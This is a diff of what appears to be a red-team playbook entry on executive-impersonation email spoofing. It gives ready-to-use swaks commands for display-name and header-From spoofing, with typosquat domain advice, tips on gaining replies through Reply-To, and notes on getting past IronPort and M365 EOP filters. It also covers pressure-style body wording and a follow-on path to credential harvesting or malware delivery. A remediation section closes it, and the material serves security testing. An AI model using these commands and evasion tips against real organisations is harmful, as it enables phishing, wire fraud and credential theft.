@@ -8,94 +8,85 @@
 ---
 
 ## Summary
-Craft email where the display name impersonates a trusted executive or internal identity while the actual sending address belongs to attacker-controlled infrastructure. Most mail clients — especially mobile — show only the display name, not the underlying address. When combined with a typosquat domain, this bypasses Anti_Spoof content filters that detect envelope/From header mismatches.
+Craft email where the display name impersonates a trusted executive while the sending address belongs to attacker-controlled infrastructure. Most mail clients show only the display name, not the underlying address. When combined with a typosquat domain, this bypasses Anti_Spoof content filters that detect envelope/From header mismatches.
 
----
+## Mechanism
+- **Protocol:** SMTP
+- **RPC/Function:** `From:` header display name field; `Reply-To:` header for response capture
+- **Effect:** Recipient sees impersonated name; no domain mismatch triggers Anti_Spoof filters; DKIM signs the mail; SPF passes
 
-## Two Approaches
-
-### Approach 1 — Display Name Spoof (Recommended)
-Envelope sender and `From:` header both use the attacker domain. Display name carries the impersonated identity. No domain mismatch — passes Anti_Spoof filters.
-
+## Commands
 ```bash
+# Approach 1 — Display Name Spoof (recommended, highest deliverability)
+# No domain mismatch — passes IronPort Anti_Spoof, EOP, all filters
 swaks -4 \
   --to target@victim.com \
-  --from executive@attacker-domain.com \
+  --from executive@your-typosquat.com \
   --server localhost --port 25 \
-  --header "From: Jane Smith, CFO <executive@attacker-domain.com>" \
-  --header "Reply-To: executive@attacker-domain.com" \
-  --header "Subject: Quick approval needed" \
-  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@attacker-domain.com>" \
+  --header "From: CEO Name <executive@your-typosquat.com>" \
+  --header "Reply-To: executive@your-typosquat.com" \
+  --header "Subject: Quick question" \
+  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
+  --header "Date: $(date -R)" \
+  --body "Body text here"
+
+# Approach 2 — Header-From Spoof (demonstrates DMARC p=none gap)
+# Only viable when DMARC p=none AND no custom Anti_Spoof filter
+swaks -4 \
+  --to target@victim.com \
+  --from bounce@your-typosquat.com \
+  --server localhost --port 25 \
+  --header "From: CEO Name <dan@victim.com>" \
+  --header "Reply-To: dan@victim.com" \
+  --header "Subject: Quick question" \
+  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
   --header "Date: $(date -R)" \
   --body "Body text here"
 ```
 
-**What victim sees:** `Jane Smith, CFO`  
-**Address visible if expanded:** `executive@attacker-domain.com` (typosquat — reads plausible at a glance)
-
-### Approach 2 — Header-From Spoof (Demonstrates DMARC p=none Gap)
-Envelope sender uses attacker domain (passes SPF), `From:` header shows the real target domain address. Only works when DMARC is `p=none` AND no custom Anti_Spoof content filter is present.
-
-```bash
-swaks -4 \
-  --to target@victim.com \
-  --from bounce@attacker-domain.com \
-  --server localhost --port 25 \
-  --header "From: Jane Smith, CFO <jsmith@victim.com>" \
-  --header "Reply-To: jsmith@victim.com" \
-  --header "Subject: Quick approval needed" \
-  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@attacker-domain.com>" \
-  --header "Date: $(date -R)" \
-  --body "Body text here"
+## Expected Output
 ```
+# swaks on successful delivery
+-> DATA
+<-  250 2.0.0 OK: message accepted
 
-**What victim sees:** `Jane Smith, CFO <jsmith@victim.com>` — the real address  
-**Risk:** Higher detection — enterprise gateways (EOP, IronPort) often have custom Anti_Spoof rules that detect the envelope/From mismatch
+# Target inbox — Approach 1
+Sender shown: "CEO Name"
+Address (if expanded): dan@target-portal.com   ← typosquat, reads plausible
 
----
-
-## Decision Matrix
-
-| Target DMARC | Custom Anti_Spoof Filter | Use |
-|---|---|---|
-| `p=none` | No | Approach 2 (demonstrates gap) |
-| `p=none` | Yes | Approach 1 |
-| `p=quarantine` or `p=reject` | Any | Approach 1 only |
-| No DMARC | No | Either |
-
----
-
-## Domain Selection for Attacker Domain
-
-Critical for Approach 1 — the visible address must hold up to casual inspection:
-- **Best:** Typosquat of the target's own domain (e.g., `gl0bex-portal.com` for `globex.com`)
-- **Avoid:** Microsoft product names (`m365`, `outlook`, `azure`) — triggers EOP brand impersonation protection in Microsoft 365 tenants regardless of SPF/DKIM scores
-
----
-
-## Body Content Guidelines
-- Short, authoritative, time-pressured (not alarmist)
-- Match the organization's writing style if samples are available
-- Plain text outperforms HTML for deliverability
-- Fewer links = better spam score
-- Include a realistic signature block with title, phone, company
-
----
-
-## Evidence to Capture
-- [ ] Screenshot: email in target inbox showing display name only (not address)
-- [ ] Screenshot: email headers showing SPF/DKIM pass, DMARC policy
-- [ ] Screenshot: Anti_Spoof quarantine alert (if Approach 2 was attempted first — demonstrates defense + gap)
-- [ ] Note: which approach landed, which was blocked
-
----
+# Target inbox — Approach 2
+Sender shown: "CEO Name <ceo@corp.local>"  ← real address
+```
 
 ## Notes
-- Approach 2 blocked + Approach 1 delivered = two distinct findings in one test. Report both.
-- On mobile clients (iOS Mail, Android Gmail), the sender address is hidden behind the display name by default — the attack surface is larger than desktop
-- `Reply-To` pointing to attacker-controlled address ensures any reply goes to attacker even when `From:` is spoofed
+**corp.local engagement (2026-03-08):**
+- **Approach 2 (header-from spoof):** Quarantined by IronPort's custom Anti_Spoof content filter. The filter detected envelope sender (`bounce@target-portal.com`) vs From header (`ceo@corp.local`) mismatch. Finding: detection working, but DMARC `p=none` means no hard block at policy layer — reportable gap.
+- **Approach 1 (display name spoof):** Bypassed IronPort Anti_Spoof filter AND M365 EOP. Landed in inbox. No domain mismatch = nothing to flag.
+- **Key insight:** Two separate filter layers. IronPort caught header-from spoof via custom content rule. M365 EOP would also catch it via its own anti-spoof. Display name spoof bypasses both because there is no mismatch to detect.
 
----
+**M365 EOP brand protection (critical):**
+- EOP quarantines mail from domains containing Microsoft product strings (`m365`, `outlook`, `azure`) regardless of SPF/DKIM/DMARC pass status
+- First attempt used `m365-verify.com` as sending domain → quarantined by EOP brand protection
+- Switched to `target-portal.com` (typosquat of `corp.local`) → delivered
+
+**Mobile client behavior:**
+- iOS Mail, Android Gmail: sender address hidden behind display name by default
+- Attack surface is larger on mobile — `CEO Name` is all the recipient sees
+- Desktop clients (Outlook, web) may show address on hover but display name is still primary
+
+**Reply-To header:**
+- Set `Reply-To` to attacker-controlled address even when `From:` is spoofed
+- Ensures any reply goes to attacker, not to the real executive
+
+## Relay / Follow-On Attack Path
+- Payload: malicious link or attachment in body → credential harvest or malware delivery
+- Pretext: wire transfer request, credential reset, VPN token, invoice approval
+
+## Remediation
+- DMARC `p=reject` blocks Approach 2; does not block Approach 1
+- EOP/IronPort: configure anti-impersonation policy to flag external mail using internal display names
+- EOP: enable "Impersonation protection" for key executives in anti-phishing policy
+- User awareness: always verify sender address, especially before financial or credential actions
 
 ## Related
 - [[ttps/recon/email-security-dns-recon]]
